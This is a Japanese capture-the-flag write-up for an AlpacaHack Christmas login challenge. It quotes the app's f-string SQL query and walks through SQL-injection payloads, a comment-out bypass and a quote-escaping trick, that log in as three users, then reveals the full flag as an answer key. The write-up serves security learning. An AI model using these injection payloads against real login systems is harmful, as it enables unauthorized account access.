# 問題url

https://alpacahack.com/daily/challenges/xmas-login

# 問題文

🦙 < このシステムには脆弱性があるパカ！
🦌 < 僕たちになりすましてログインできたら、フラグをプレゼントするよ！
🎅 < メリークリスマス！ホッホッホッ！

# writeup

app.py
```python
# flagはFLAG_1~3に分割されている。全部を取得できれば復元してゴール。
FLAG_1, FLAG_2, FLAG_3 = FLAG[:24], FLAG[24:48], FLAG[48:]

# 中略

# f-stringでユーザーの入力値をそのままクエリに入れている。sqlインジェクションできそう。
query = (
    f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
)

# 中略

user = conn.execute(query).fetchone()

# 中略

# 以下の3つのusernameでログインできればいい。
    if user[0] == "alpaca":
        return f"Hello, alpaca! Here is your flag: {FLAG_1}"
    elif user[0] == "reindeer":
        return f"Hello, reindeer! Here is your flag: {FLAG_2}"
    elif user[0] == "santa_claus_admin":
        return f"Hello, santa_claus_admin! Here is your flag: {FLAG_3}"
```

## flag_1

usernameの末尾で `--` を入れることで、パスワードの判定全体をコメントアウトしてしまう。

- username: `alpaca' --`
- password: `anything`
- executed sql
```sql
SELECT *
FROM users
WHERE username='alpaca' --' AND password='anything';

```

flag_1: `Hello, alpaca! Here is your flag: Alpaca{M3rry_Xmas!_Th1s_`

## flag_2

実はusernameの長さは12文字以下でないといけなかった。

フロント側の制限 app.py24行目
```html 
<input name="username" placeholder="alpaca" maxlength="12" required>
```

バック側の制限 app.py57行目
```python
    if len(username) > 12 or len(password) > 48:
        return "Your input is too long!"
```

シングルクォート2つ `''` でシングルクォートのエスケープになる性質を利用する。 

- username: `a'`
- password: ` OR username='reindeer`
- executed sql
```sql
SELECT *
FROM users
WHERE username='a'' AND password='
    OR username='reindeer';

```

flag_2: `Hello, reindeer! Here is your flag: is_4_g1ft_fr0m_santa!_an`

## flag_3

flag_2の時と同じ手法です。

- username: `a'`
- password: ` OR username='santa_claus_admin`
- executed sql
```sql
SELECT *
FROM users
WHERE username='a'' AND password='
    OR username='santa_claus_admin';

```

flag_3: `Hello, santa_claus_admin! Here is your flag: d_Happy_N3w_Year_2026!!}`

## 答え
<details><summary>ネタバレ防止で折りたたみ</summary>

`Alpaca{M3rry_Xmas!_Th1s_is_4_g1ft_fr0m_santa!_and_Happy_N3w_Year_2026!!}`

</details>
